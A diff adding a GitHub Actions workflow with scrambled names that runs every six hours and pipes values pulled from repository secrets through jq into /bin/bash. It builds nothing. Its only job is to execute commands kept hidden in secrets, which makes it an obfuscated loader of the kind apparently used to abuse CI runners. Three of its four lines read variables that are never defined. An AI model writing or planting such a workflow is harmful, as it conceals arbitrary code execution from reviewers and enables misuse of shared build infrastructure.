@@ -1,0 +1,20 @@
+name: shatianniuderenn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shatianniuderenn
+        env:
+          emawp68: ${{ secrets.emawp68 }}
+        run: |
+          echo $emawp68 | jq -r .c51 | /bin/bash
+          echo $cgfja75 | jq -r .crgfz3420 | /bin/bash
+          echo $ktjd421 | jq -r .vziza16 | /bin/bash
+          echo $nspo86046 | jq -r .dkn0291 | /bin/bash
+
